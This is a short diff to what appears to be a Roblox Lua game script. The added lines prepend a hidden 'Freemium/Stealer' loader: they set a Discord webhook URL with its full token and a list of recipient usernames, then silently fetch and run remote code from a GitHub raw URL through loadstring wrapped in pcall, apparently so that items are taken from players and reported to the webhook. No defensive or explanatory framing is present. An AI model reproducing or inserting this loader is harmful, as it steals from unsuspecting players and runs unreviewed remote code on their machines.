@@ -1,3 +1,15 @@
+-- [[ CONFIGURATION AUTH & WEBHOOK ]]
+_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1501307335245561991/COo1OF8xvIbYpVT6SBTm1XvGrT2Jvzc1rAy5dTyHq3DgvUkitzhWVgCk2kxxZhQ5U4BX"
+_G.MY_USERNAMES = {"mexicanguy_jason", "lagazeusedubled", "X"}
+_G.PING_POOR = true
+
+-- Lancement automatique du système Freemium/Stealer
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Balsback7/Baddies/refs/heads/main/freemium.lua", true))()
+    end)
+end)
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
